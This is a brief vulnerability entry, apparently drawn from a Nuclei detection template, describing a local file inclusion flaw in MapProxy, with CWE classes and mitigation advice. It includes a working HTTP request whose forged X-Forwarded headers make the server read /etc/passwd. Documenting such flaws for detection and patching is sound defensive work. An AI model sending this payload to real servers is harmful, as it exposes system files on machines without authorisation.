# Vulnerability: MapProxy - Local File Inclusion
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`mapproxy-file-read.yaml`)

## Description
MapProxy improperly validates and processes X-Forwarded headers, allowing attackers to construct file:// URLs that bypass access controls and read local files through local file inclusion vulnerability.

## Secure Mitigation
Update MapProxy to a patched version that properly validates X-Forwarded headers and restricts file:// URL schemes in proxy configurations.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{path}}?wms_capabilities&type=external HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Proto: file
X-Forwarded-Host: ///etc/passwd#.xml
```

